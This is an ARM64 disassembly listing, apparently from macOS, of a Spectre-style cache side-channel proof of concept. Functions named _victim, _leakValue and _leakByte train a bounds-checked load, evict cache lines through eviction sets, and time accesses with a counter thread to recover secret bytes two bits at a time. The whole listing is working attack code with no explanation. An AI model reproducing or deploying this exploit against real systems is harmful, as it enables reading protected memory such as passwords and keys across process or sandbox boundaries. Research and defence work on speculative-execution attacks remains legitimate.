000000010000327c	add	x21, x21, #0x1
0000000100003280	mov	x20, x23
0000000100003284	subs	x23, x20, #0x1
0000000100003288	b.ne	0x10000324c
000000010000328c	ldp	x29, x30, [sp, #0x30]
0000000100003290	ldp	x20, x19, [sp, #0x20]
0000000100003294	ldp	x22, x21, [sp, #0x10]
0000000100003298	ldp	x24, x23, [sp], #0x40
000000010000329c	ret
_list_split:
00000001000032a0	cbz	x0, 0x100003338
00000001000032a4	stp	x22, x21, [sp, #-0x30]!
00000001000032a8	stp	x20, x19, [sp, #0x10]
00000001000032ac	stp	x29, x30, [sp, #0x20]
00000001000032b0	add	x29, sp, #0x20
00000001000032b4	mov	x21, x2
00000001000032b8	mov	x19, x1
00000001000032bc	mov	x20, x0
00000001000032c0	bl	_list_length
00000001000032c4	mov	x8, #0x0
00000001000032c8	sub	w9, w21, #0x1
00000001000032cc	bic	w10, w21, w21, asr #31
00000001000032d0	sdiv	w11, w0, w21
00000001000032d4	b	0x1000032dc
00000001000032d8	add	x8, x8, #0x1
00000001000032dc	cmp	x8, x10
00000001000032e0	b.eq	0x10000332c
00000001000032e4	str	x20, [x19, x8, lsl #3]
00000001000032e8	cbz	x20, 0x1000032f0
00000001000032ec	str	xzr, [x20, #0x8]
00000001000032f0	mov	w12, #0x1
00000001000032f4	cbz	x20, 0x1000032d8
00000001000032f8	ldr	x20, [x20]
00000001000032fc	add	w13, w12, #0x1
0000000100003300	cmp	w12, w11
0000000100003304	mov	x12, x13
0000000100003308	b.lt	0x1000032f4
000000010000330c	mov	x12, x13
0000000100003310	cmp	x8, x9
0000000100003314	b.eq	0x1000032f4
0000000100003318	cbz	x20, 0x1000032d8
000000010000331c	ldr	x12, [x20, #0x8]
0000000100003320	cbz	x12, 0x1000032d8
0000000100003324	str	xzr, [x12]
0000000100003328	b	0x1000032d8
000000010000332c	ldp	x29, x30, [sp, #0x20]
0000000100003330	ldp	x20, x19, [sp, #0x10]
0000000100003334	ldp	x22, x21, [sp], #0x30
0000000100003338	ret
_list_from_chunks:
000000010000333c	ldr	x8, [x0]
0000000100003340	cbz	x8, 0x10000340c
0000000100003344	cbz	x1, 0x10000340c
0000000100003348	add	w8, w2, #0x1
000000010000334c	sdiv	w9, w8, w3
0000000100003350	msub	w9, w9, w3, w8
0000000100003354	ldr	x8, [x1, w9, sxtw #3]
0000000100003358	cbz	x8, 0x10000340c
000000010000335c	ldr	x10, [x1, w2, sxtw #3]
0000000100003360	cbz	x10, 0x100003368
0000000100003364	str	xzr, [x10, #0x8]
0000000100003368	sxtw	x8, w9
000000010000336c	cbz	x10, 0x10000338c
0000000100003370	mov	x11, x10
0000000100003374	ldr	x10, [x10]
0000000100003378	cbz	x10, 0x100003388
000000010000337c	ldr	x12, [x1, x8, lsl #3]
0000000100003380	cmp	x10, x12
0000000100003384	b.ne	0x10000336c
0000000100003388	str	xzr, [x11]
000000010000338c	ldr	x10, [x1, x8, lsl #3]
0000000100003390	str	x10, [x0]
0000000100003394	cbz	x10, 0x1000033a8
0000000100003398	mov	x8, #0x0
000000010000339c	mov	x0, x10
00000001000033a0	str	x8, [x10, #0x8]
00000001000033a4	mov	x10, x0
00000001000033a8	mov	x8, x10
00000001000033ac	b	0x1000033bc
00000001000033b0	str	x12, [x8]
00000001000033b4	ldr	x10, [x1, x10, lsl #3]
00000001000033b8	cbnz	x10, 0x100003410
00000001000033bc	cmp	w9, w2
00000001000033c0	b.eq	0x100003404
00000001000033c4	ldr	x10, [x1, w9, sxtw #3]
00000001000033c8	cbz	x10, 0x100003404
00000001000033cc	add	w9, w9, #0x1
00000001000033d0	sdiv	w10, w9, w3
00000001000033d4	msub	w9, w10, w3, w9
00000001000033d8	sxtw	x10, w9
00000001000033dc	cbz	x8, 0x1000033b4
00000001000033e0	ldr	x11, [x8]
00000001000033e4	ldr	x12, [x1, x10, lsl #3]
00000001000033e8	cmp	x11, #0x0
00000001000033ec	ccmp	x11, x12, #0x4, ne
00000001000033f0	b.eq	0x1000033b0
00000001000033f4	str	x8, [x11, #0x8]
00000001000033f8	ldr	x8, [x8]
00000001000033fc	cbnz	x8, 0x1000033e0
0000000100003400	b	0x1000033b4
0000000100003404	cbz	x8, 0x10000340c
0000000100003408	str	xzr, [x8]
000000010000340c	ret
0000000100003410	mov	x0, x8
0000000100003414	b	0x1000033a0
_tests_avg:
0000000100003418	stp	x22, x21, [sp, #-0x30]!
000000010000341c	stp	x20, x19, [sp, #0x10]
0000000100003420	stp	x29, x30, [sp, #0x20]
0000000100003424	add	x29, sp, #0x20
0000000100003428	mov	x19, x1
000000010000342c	mov	x20, x0
0000000100003430	mov	w21, #0x0
0000000100003434	mov	w22, #0x32
0000000100003438	cbz	w22, 0x10000345c
000000010000343c	mov	x0, x20
0000000100003440	mov	x1, x19
0000000100003444	bl	_test_set
0000000100003448	cmp	w0, #0x320
000000010000344c	csel	w8, w0, wzr, lo
0000000100003450	add	w21, w21, w8
0000000100003454	sub	w22, w22, #0x1
0000000100003458	cbnz	w22, 0x10000343c
000000010000345c	ucvtf	s0, w21
0000000100003460	mov	w8, #0x42480000
0000000100003464	fmov	s1, w8
0000000100003468	fdiv	s0, s0, s1
000000010000346c	fcvtzs	w8, s0
0000000100003470	adrp	x9, 5 ; 0x100008000
0000000100003474	ldrb	w9, [x9]
0000000100003478	cmp	w9, #0x0
000000010000347c	mov	w9, #0xdc
0000000100003480	csel	x9, x9, xzr, ne
0000000100003484	cmp	x9, w8, sxtw
0000000100003488	cset	w0, lo
000000010000348c	ldp	x29, x30, [sp, #0x20]
0000000100003490	ldp	x20, x19, [sp, #0x10]
0000000100003494	ldp	x22, x21, [sp], #0x30
0000000100003498	ret
_list_concat:
000000010000349c	cbz	x0, 0x1000034c4
00000001000034a0	ldr	x8, [x0]
00000001000034a4	cbz	x8, 0x1000034c4
00000001000034a8	mov	x9, x8
00000001000034ac	ldr	x8, [x8]
00000001000034b0	cbnz	x8, 0x1000034a8
00000001000034b4	str	x1, [x9]
00000001000034b8	cbz	x1, 0x1000034c0
00000001000034bc	str	x9, [x1, #0x8]
00000001000034c0	ret
00000001000034c4	str	x1, [x0]
00000001000034c8	ret
_test_set:
00000001000034cc	stp	x20, x19, [sp, #-0x20]!
00000001000034d0	stp	x29, x30, [sp, #0x10]
00000001000034d4	add	x29, sp, #0x10
00000001000034d8	mov	x19, x1
00000001000034dc	ldr	x10, [x1]
00000001000034e0	ldr	x10, [x1]
00000001000034e4	dmb	sy
00000001000034e8	isb
00000001000034ec	bl	_traverse_list_skylake
00000001000034f0	dmb	sy
00000001000034f4	isb
00000001000034f8	adrp	x8, 5 ; 0x100008000
00000001000034fc	ldr	w9, [x8, #0x80]
0000000100003500	dmb	sy
0000000100003504	isb
0000000100003508	ldr	x10, [x19]
000000010000350c	dmb	sy
0000000100003510	isb
0000000100003514	ldr	w8, [x8, #0x80]
0000000100003518	dmb	sy
000000010000351c	isb
0000000100003520	sub	w0, w8, w9
0000000100003524	ldp	x29, x30, [sp, #0x10]
0000000100003528	ldp	x20, x19, [sp], #0x20
000000010000352c	ret
_cache_remove:
0000000100003530	nop
0000000100003534	ldr	x8, #0x4ad4
0000000100003538	ldr	x0, [x8, w0, uxtw #3]
000000010000353c	b	_traverse_list_skylake
_cache_remove_prepare:
0000000100003540	stp	x26, x25, [sp, #-0x50]!
0000000100003544	stp	x24, x23, [sp, #0x10]
0000000100003548	stp	x22, x21, [sp, #0x20]
000000010000354c	stp	x20, x19, [sp, #0x30]
0000000100003550	stp	x29, x30, [sp, #0x40]
0000000100003554	add	x29, sp, #0x40
0000000100003558	mov	x19, x0
000000010000355c	adrp	x22, 5 ; 0x100008000
0000000100003560	ldr	x8, [x22, #0x8]
0000000100003564	cbnz	x8, 0x10000356c
0000000100003568	bl	_evset_init
000000010000356c	bl	_timer_start
0000000100003570	mov	x23, #0x0
0000000100003574	adrp	x21, 5 ; 0x100008000
0000000100003578	adrp	x24, 5 ; 0x100008000
000000010000357c	adrp	x25, 5 ; 0x100008000
0000000100003580	mov	w26, #0xdc
0000000100003584	ldrsw	x20, [x21, #0x1c]
0000000100003588	cmp	x23, x20
000000010000358c	b.hs	0x100003608
0000000100003590	ldr	x10, [x19]
0000000100003594	ldr	x10, [x19]
0000000100003598	dmb	sy
000000010000359c	isb
00000001000035a0	ldr	x8, [x22, #0x8]
00000001000035a4	lsl	x20, x23, #3
00000001000035a8	ldr	x0, [x8, x20]
00000001000035ac	bl	_traverse_list_skylake
00000001000035b0	ldr	x8, [x22, #0x8]
00000001000035b4	ldr	x0, [x8, x20]
00000001000035b8	bl	_traverse_list_skylake
00000001000035bc	dmb	sy
00000001000035c0	isb
00000001000035c4	ldr	x8, [x24, #0x80]
00000001000035c8	dmb	sy
00000001000035cc	isb
00000001000035d0	ldr	x10, [x19]
00000001000035d4	dmb	sy
00000001000035d8	isb
00000001000035dc	ldr	x9, [x24, #0x80]
00000001000035e0	dmb	sy
00000001000035e4	isb
00000001000035e8	ldrb	w10, [x25]
00000001000035ec	cmp	w10, #0x0
00000001000035f0	csel	x10, x26, xzr, ne
00000001000035f4	sub	x8, x9, x8
00000001000035f8	cmp	x8, x10
00000001000035fc	b.hi	0x100003658
0000000100003600	add	x23, x23, #0x1
0000000100003604	b	0x100003584
0000000100003608	add	w8, w20, #0x1
000000010000360c	str	w8, [x21, #0x1c]
0000000100003610	and	w8, w8, #0x80000007
0000000100003614	cmp	w8, #0x1
0000000100003618	b.ne	0x100003648
000000010000361c	ldr	x0, [x22, #0x8]
0000000100003620	add	w8, w20, #0x9
0000000100003624	sbfiz	x21, x8, #3, #32
0000000100003628	mov	x1, x21
000000010000362c	bl	0x100003d14 ; symbol stub for: _realloc
0000000100003630	str	x0, [x22, #0x8]
0000000100003634	adrp	x22, 5 ; 0x100008000
0000000100003638	ldr	x0, [x22, #0x10]
000000010000363c	mov	x1, x21
0000000100003640	bl	0x100003d14 ; symbol stub for: _realloc
0000000100003644	str	x0, [x22, #0x10]
0000000100003648	mov	x0, x19
000000010000364c	bl	_evset_find
0000000100003650	bl	_timer_stop
0000000100003654	b	0x10000365c
0000000100003658	mov	x20, x23
000000010000365c	mov	x0, x20
0000000100003660	ldp	x29, x30, [sp, #0x40]
0000000100003664	ldp	x20, x19, [sp, #0x30]
0000000100003668	ldp	x22, x21, [sp, #0x20]
000000010000366c	ldp	x24, x23, [sp, #0x10]
0000000100003670	ldp	x26, x25, [sp], #0x50
0000000100003674	ret
_traverse_list_skylake:
0000000100003678	cbz	x0, 0x1000036c4
000000010000367c	ldr	x8, [x0]
0000000100003680	cbz	x8, 0x1000036c4
0000000100003684	ldr	x8, [x8]
0000000100003688	cbz	x8, 0x1000036c4
000000010000368c	ldr	x10, [x0]
0000000100003690	ldr	x8, [x0]
0000000100003694	ldr	x10, [x8]
0000000100003698	ldr	x8, [x0]
000000010000369c	ldr	x8, [x8]
00000001000036a0	ldr	x10, [x8]
00000001000036a4	ldr	x10, [x0]
00000001000036a8	ldr	x8, [x0]
00000001000036ac	ldr	x10, [x8]
00000001000036b0	ldr	x8, [x0]
00000001000036b4	ldr	x8, [x8]
00000001000036b8	ldr	x10, [x8]
00000001000036bc	ldr	x0, [x0]
00000001000036c0	cbnz	x0, 0x10000367c
00000001000036c4	ret
_counter_thread_thread:
00000001000036c8	ldr	x10, [x0]
00000001000036cc	add	x10, x10, #0x1
00000001000036d0	str	x10, [x0]
00000001000036d4	b	0x1000036cc
00000001000036d8	mov	x0, #0x0
00000001000036dc	ret
_timer_start:
00000001000036e0	adrp	x8, 5 ; 0x100008000
00000001000036e4	ldr	w9, [x8, #0x38]
00000001000036e8	add	w10, w9, #0x1
00000001000036ec	str	w10, [x8, #0x38]
00000001000036f0	cbz	w9, 0x1000036f8
00000001000036f4	ret
00000001000036f8	adr	x0, #0x4948
00000001000036fc	nop
0000000100003700	adr	x2, #-0x38
0000000100003704	nop
0000000100003708	adr	x3, #0x4978
000000010000370c	nop
0000000100003710	mov	x1, #0x0
0000000100003714	b	0x100003ce4 ; symbol stub for: _pthread_create
_timer_stop:
0000000100003718	adrp	x8, 5 ; 0x100008000
000000010000371c	ldr	w9, [x8, #0x38]
0000000100003720	subs	w9, w9, #0x1
0000000100003724	str	w9, [x8, #0x38]
0000000100003728	b.eq	0x100003730
000000010000372c	ret
0000000100003730	nop
0000000100003734	ldr	x0, #0x490c
0000000100003738	b	0x100003cd8 ; symbol stub for: _pthread_cancel
_victim:
000000010000373c	lsr	x8, x0, #2
0000000100003740	nop
0000000100003744	ldr	x9, #0x4914
0000000100003748	ldr	x9, [x9]
000000010000374c	cmp	x8, x9
0000000100003750	b.hs	0x10000377c
0000000100003754	ubfiz	w9, w0, #1, #2
0000000100003758	nop
000000010000375c	ldr	x10, #0x48f4
0000000100003760	nop
0000000100003764	ldr	x11, #0x48e4
0000000100003768	ldrsb	w8, [x11, x8]
000000010000376c	asr	w8, w8, w9
0000000100003770	ubfiz	w8, w8, #9, #2
0000000100003774	add	x8, x10, x8
0000000100003778	ldr	x10, [x8]
000000010000377c	ret
_setup:
0000000100003780	sub	sp, sp, #0x70
0000000100003784	stp	x26, x25, [sp, #0x20]
0000000100003788	stp	x24, x23, [sp, #0x30]
000000010000378c	stp	x22, x21, [sp, #0x40]
0000000100003790	stp	x20, x19, [sp, #0x50]
0000000100003794	stp	x29, x30, [sp, #0x60]
0000000100003798	add	x29, sp, #0x60
000000010000379c	mov	x19, x1
00000001000037a0	mov	x20, x0
00000001000037a4	adrp	x23, 5 ; 0x100008000
00000001000037a8	ldr	x0, [x23, #0x48]
00000001000037ac	cbz	x0, 0x1000037b4
00000001000037b0	bl	0x100003c84 ; symbol stub for: _free
00000001000037b4	adrp	x22, 5 ; 0x100008000
00000001000037b8	ldr	x8, [x22, #0x50]
00000001000037bc	cbnz	x8, 0x1000037d0
00000001000037c0	mov	w0, #0x800
00000001000037c4	bl	0x100003ca8 ; symbol stub for: _malloc
00000001000037c8	str	x0, [x22, #0x50]
00000001000037cc	cbz	x0, 0x10000390c
00000001000037d0	mov	x0, x20
00000001000037d4	bl	0x100003d38 ; symbol stub for: _strlen
00000001000037d8	add	x25, x0, #0x1
00000001000037dc	mov	x0, x19
00000001000037e0	bl	0x100003d38 ; symbol stub for: _strlen
00000001000037e4	add	x8, x25, x0
00000001000037e8	add	x0, x8, #0x1
00000001000037ec	bl	0x100003ca8 ; symbol stub for: _malloc
00000001000037f0	str	x0, [x23, #0x48]
00000001000037f4	cbz	x0, 0x1000038c0
00000001000037f8	mov	x21, x0
00000001000037fc	adrp	x24, 5 ; 0x100008000
0000000100003800	ldr	x0, [x24, #0x58]
0000000100003804	cbnz	x0, 0x100003818
0000000100003808	mov	w0, #0x8
000000010000380c	bl	0x100003ca8 ; symbol stub for: _malloc
0000000100003810	str	x0, [x24, #0x58]
0000000100003814	cbz	x0, 0x10000393c
0000000100003818	str	x25, [x0]
000000010000381c	mov	x0, x21
0000000100003820	mov	x1, x20
0000000100003824	bl	0x100003d2c ; symbol stub for: _strcpy
0000000100003828	ldr	x8, [x23, #0x48]
000000010000382c	ldr	x9, [x24, #0x58]
0000000100003830	ldr	x9, [x9]
0000000100003834	add	x0, x8, x9
0000000100003838	mov	x1, x19
000000010000383c	bl	0x100003d2c ; symbol stub for: _strcpy
0000000100003840	adrp	x8, 5 ; 0x100008000
0000000100003844	ldrb	w9, [x8, #0x60]
0000000100003848	tbnz	w9, #0x0, 0x1000038a4
000000010000384c	mov	w9, #0x1
0000000100003850	strb	w9, [x8, #0x60]
0000000100003854	ldr	x0, [x22, #0x50]
0000000100003858	bl	_cache_remove_prepare
000000010000385c	adr	x19, #0x4834
0000000100003860	nop
0000000100003864	str	x0, [x19]
0000000100003868	ldr	x8, [x22, #0x50]
000000010000386c	add	x0, x8, #0x200
0000000100003870	bl	_cache_remove_prepare
0000000100003874	str	x0, [x19, #0x8]
0000000100003878	ldr	x8, [x22, #0x50]
000000010000387c	add	x0, x8, #0x400
0000000100003880	bl	_cache_remove_prepare
0000000100003884	str	x0, [x19, #0x10]
0000000100003888	ldr	x8, [x22, #0x50]
000000010000388c	add	x0, x8, #0x600
0000000100003890	bl	_cache_remove_prepare
0000000100003894	str	x0, [x19, #0x18]
0000000100003898	ldr	x0, [x24, #0x58]
000000010000389c	bl	_cache_remove_prepare
00000001000038a0	str	x0, [x19, #0x20]
00000001000038a4	ldr	x8, [x24, #0x58]
00000001000038a8	ldr	x8, [x8]
00000001000038ac	lsl	x8, x8, #2
00000001000038b0	sub	x8, x8, #0x4
00000001000038b4	adrp	x9, 5 ; 0x100008000
00000001000038b8	str	x8, [x9, #0x68]
00000001000038bc	b	0x100003974
00000001000038c0	nop
00000001000038c4	ldr	x8, #0x73c ; literal pool symbol address: ___stderrp
00000001000038c8	ldr	x21, [x8]
00000001000038cc	mov	x0, x20
00000001000038d0	bl	0x100003d38 ; symbol stub for: _strlen
00000001000038d4	mov	x20, x0
00000001000038d8	mov	x0, x19
00000001000038dc	bl	0x100003d38 ; symbol stub for: _strlen
00000001000038e0	add	x8, x20, x0
00000001000038e4	add	x8, x8, #0x2
00000001000038e8	str	x8, [sp]
00000001000038ec	adr	x1, #0x574 ; literal pool for: "malloc of array1 with size %zu failed\n"
00000001000038f0	nop
00000001000038f4	mov	x0, x21
00000001000038f8	bl	0x100003c78 ; symbol stub for: _fprintf
00000001000038fc	ldr	x0, [x22, #0x50]
0000000100003900	bl	0x100003c84 ; symbol stub for: _free
0000000100003904	str	xzr, [x22, #0x50]
0000000100003908	b	0x100003974
000000010000390c	nop
0000000100003910	ldr	x8, #0x6f0 ; literal pool symbol address: ___stderrp
0000000100003914	ldr	x0, [x8]
0000000100003918	mov	w10, #0x200
000000010000391c	mov	w8, #0x4
0000000100003920	mov	w9, #0x800
0000000100003924	stp	x8, x10, [sp, #0x8]
0000000100003928	str	x9, [sp]
000000010000392c	adr	x1, #0x4f6 ; literal pool for: "malloc of array2 with size %d failed (%d entries of size %d)\n"
0000000100003930	nop
0000000100003934	bl	0x100003c78 ; symbol stub for: _fprintf
0000000100003938	b	0x100003974
000000010000393c	nop
0000000100003940	ldr	x8, #0x6c0 ; literal pool symbol address: ___stderrp
0000000100003944	ldr	x0, [x8]
0000000100003948	mov	w8, #0x8
000000010000394c	str	x8, [sp]
0000000100003950	adr	x1, #0x537 ; literal pool for: "malloc of array_size with size %zu failed\n"
0000000100003954	nop
0000000100003958	bl	0x100003c78 ; symbol stub for: _fprintf
000000010000395c	ldr	x0, [x22, #0x50]
0000000100003960	bl	0x100003c84 ; symbol stub for: _free
0000000100003964	str	xzr, [x22, #0x50]
0000000100003968	ldr	x0, [x23, #0x48]
000000010000396c	bl	0x100003c84 ; symbol stub for: _free
0000000100003970	str	xzr, [x23, #0x48]
0000000100003974	ldp	x29, x30, [sp, #0x60]
0000000100003978	ldp	x20, x19, [sp, #0x50]
000000010000397c	ldp	x22, x21, [sp, #0x40]
0000000100003980	ldp	x24, x23, [sp, #0x30]
0000000100003984	ldp	x26, x25, [sp, #0x20]
0000000100003988	add	sp, sp, #0x70
000000010000398c	ret
_leakValue:
0000000100003990	sub	sp, sp, #0x70
0000000100003994	stp	x28, x27, [sp, #0x10]
0000000100003998	stp	x26, x25, [sp, #0x20]
000000010000399c	stp	x24, x23, [sp, #0x30]
00000001000039a0	stp	x22, x21, [sp, #0x40]
00000001000039a4	stp	x20, x19, [sp, #0x50]
00000001000039a8	stp	x29, x30, [sp, #0x60]
00000001000039ac	add	x29, sp, #0x60
00000001000039b0	mov	x19, x0
00000001000039b4	mov	w8, #0x0
00000001000039b8	adr	x22, #0x46b8
00000001000039bc	nop
00000001000039c0	stp	xzr, xzr, [x22]
00000001000039c4	adrp	x23, 5 ; 0x100008000
00000001000039c8	mov	w24, #0xcccd
00000001000039cc	movk	w24, #0xcccc, lsl #16
00000001000039d0	mov	w25, #0x9998
00000001000039d4	movk	w25, #0x1999, lsl #16
00000001000039d8	mov	w26, #0x9999
00000001000039dc	movk	w26, #0x1999, lsl #16
00000001000039e0	adrp	x27, 5 ; 0x100008000
00000001000039e4	adrp	x28, 5 ; 0x100008000
00000001000039e8	b	0x100003b24
00000001000039ec	adrp	x11, 5 ; 0x100008000
00000001000039f0	ldr	x8, [x11, #0x50]
00000001000039f4	dmb	sy
00000001000039f8	isb
00000001000039fc	ldr	x9, [x28, #0x80]
0000000100003a00	dmb	sy
0000000100003a04	isb
0000000100003a08	ldr	x10, [x8]
0000000100003a0c	dmb	sy
0000000100003a10	isb
0000000100003a14	ldr	x8, [x28, #0x80]
0000000100003a18	dmb	sy
0000000100003a1c	isb
0000000100003a20	sub	x10, x8, x9
0000000100003a24	cmp	x10, #0x78
0000000100003a28	ccmp	x8, x9, #0x4, lo
0000000100003a2c	ldr	w8, [x22]
0000000100003a30	cinc	w8, w8, ne
0000000100003a34	str	w8, [x22]
0000000100003a38	ldr	x8, [x11, #0x50]
0000000100003a3c	add	x8, x8, #0x200
0000000100003a40	dmb	sy
0000000100003a44	isb
0000000100003a48	ldr	x9, [x28, #0x80]
0000000100003a4c	dmb	sy
0000000100003a50	isb
0000000100003a54	ldr	x10, [x8]
0000000100003a58	dmb	sy
0000000100003a5c	isb
0000000100003a60	ldr	x8, [x28, #0x80]
0000000100003a64	dmb	sy
0000000100003a68	isb
0000000100003a6c	sub	x10, x8, x9
0000000100003a70	cmp	x10, #0x78
0000000100003a74	ccmp	x8, x9, #0x4, lo
0000000100003a78	ldr	w8, [x22, #0x4]
0000000100003a7c	cinc	w8, w8, ne
0000000100003a80	str	w8, [x22, #0x4]
0000000100003a84	ldr	x8, [x11, #0x50]
0000000100003a88	add	x8, x8, #0x400
0000000100003a8c	dmb	sy
0000000100003a90	isb
0000000100003a94	ldr	x9, [x28, #0x80]
0000000100003a98	dmb	sy
0000000100003a9c	isb
0000000100003aa0	ldr	x10, [x8]
0000000100003aa4	dmb	sy
0000000100003aa8	isb
0000000100003aac	ldr	x8, [x28, #0x80]
0000000100003ab0	dmb	sy
0000000100003ab4	isb
0000000100003ab8	sub	x10, x8, x9
0000000100003abc	cmp	x10, #0x78
0000000100003ac0	ccmp	x8, x9, #0x4, lo
0000000100003ac4	ldr	w8, [x22, #0x8]
0000000100003ac8	cinc	w8, w8, ne
0000000100003acc	str	w8, [x22, #0x8]
0000000100003ad0	ldr	x8, [x11, #0x50]
0000000100003ad4	add	x8, x8, #0x600
0000000100003ad8	dmb	sy
0000000100003adc	isb
0000000100003ae0	ldr	x9, [x28, #0x80]
0000000100003ae4	dmb	sy
0000000100003ae8	isb
0000000100003aec	ldr	x10, [x8]
0000000100003af0	dmb	sy
0000000100003af4	isb
0000000100003af8	ldr	x8, [x28, #0x80]
0000000100003afc	dmb	sy
0000000100003b00	isb
0000000100003b04	sub	x10, x8, x9
0000000100003b08	cmp	x10, #0x78
0000000100003b0c	ccmp	x8, x9, #0x4, lo
0000000100003b10	ldr	w8, [x22, #0xc]
0000000100003b14	cinc	w8, w8, ne
0000000100003b18	str	w8, [x22, #0xc]
0000000100003b1c	ldr	w8, [sp, #0xc]
0000000100003b20	add	w8, w8, #0x1
0000000100003b24	cmp	w8, #0x4
0000000100003b28	b.eq	0x100003b98
0000000100003b2c	str	w8, [sp, #0xc]
0000000100003b30	adr	x20, #0x4560
0000000100003b34	nop
0000000100003b38	ldr	x0, [x20]
0000000100003b3c	bl	_cache_remove
0000000100003b40	ldr	x0, [x20, #0x8]
0000000100003b44	bl	_cache_remove
0000000100003b48	ldr	x0, [x20, #0x10]
0000000100003b4c	bl	_cache_remove
0000000100003b50	ldr	x0, [x20, #0x18]
0000000100003b54	bl	_cache_remove
0000000100003b58	dmb	sy
0000000100003b5c	isb
0000000100003b60	mov	w21, #0x28
0000000100003b64	tbnz	w21, #0x1f, 0x1000039ec
0000000100003b68	ldr	x8, [x23, #0x68]
0000000100003b6c	madd	w9, w21, w24, w25
0000000100003b70	ror	w9, w9, #0x1
0000000100003b74	cmp	w9, w26
0000000100003b78	csel	x20, x19, x8, lo
0000000100003b7c	ldr	x0, [x27, #0xb0]
0000000100003b80	bl	_cache_remove
0000000100003b84	mov	x0, x20
0000000100003b88	bl	_victim
0000000100003b8c	sub	w21, w21, #0x1
0000000100003b90	tbz	w21, #0x1f, 0x100003b68
0000000100003b94	b	0x1000039ec
0000000100003b98	adr	x8, #0x44dc
0000000100003b9c	nop
0000000100003ba0	ldp	w9, w10, [x8]
0000000100003ba4	cmp	w9, #0x0
0000000100003ba8	cset	w11, gt
0000000100003bac	bic	w9, w9, w9, asr #31
0000000100003bb0	mov	w12, #0x2
0000000100003bb4	cmp	w10, w9
0000000100003bb8	csel	w11, w12, w11, gt
0000000100003bbc	csel	w9, w10, w9, gt
0000000100003bc0	ldr	w8, [x8, #0x8]
0000000100003bc4	mov	w10, #0x3
0000000100003bc8	cmp	w8, w9
0000000100003bcc	csel	w0, w10, w11, gt
0000000100003bd0	ldp	x29, x30, [sp, #0x60]
0000000100003bd4	ldp	x20, x19, [sp, #0x50]
0000000100003bd8	ldp	x22, x21, [sp, #0x40]
0000000100003bdc	ldp	x24, x23, [sp, #0x30]
0000000100003be0	ldp	x26, x25, [sp, #0x20]
0000000100003be4	ldp	x28, x27, [sp, #0x10]
0000000100003be8	add	sp, sp, #0x70
0000000100003bec	ret
_leakByte:
0000000100003bf0	stp	x22, x21, [sp, #-0x30]!
0000000100003bf4	stp	x20, x19, [sp, #0x10]
0000000100003bf8	stp	x29, x30, [sp, #0x20]
0000000100003bfc	add	x29, sp, #0x20
0000000100003c00	mov	x19, x0
0000000100003c04	lsl	x20, x0, #2
0000000100003c08	mov	w0, #0x3
0000000100003c0c	bfi	x0, x19, #2, #62
0000000100003c10	bl	_leakValue
0000000100003c14	mov	x21, x0
0000000100003c18	mov	w0, #0x2
0000000100003c1c	bfi	x0, x19, #2, #62
0000000100003c20	bl	_leakValue
0000000100003c24	mov	x22, x0
0000000100003c28	mov	w0, #0x1
0000000100003c2c	bfi	x0, x19, #2, #62
0000000100003c30	bl	_leakValue
0000000100003c34	mov	x19, x0
0000000100003c38	mov	x0, x20
0000000100003c3c	bl	_leakValue
0000000100003c40	lsl	w8, w21, #4
0000000100003c44	orr	w8, w8, w22, lsl #2
0000000100003c48	orr	w8, w8, w19
0000000100003c4c	orr	w0, w0, w8, lsl #2
0000000100003c50	ldp	x29, x30, [sp, #0x20]
0000000100003c54	ldp	x20, x19, [sp, #0x10]
0000000100003c58	ldp	x22, x21, [sp], #0x30
0000000100003c5c	ret
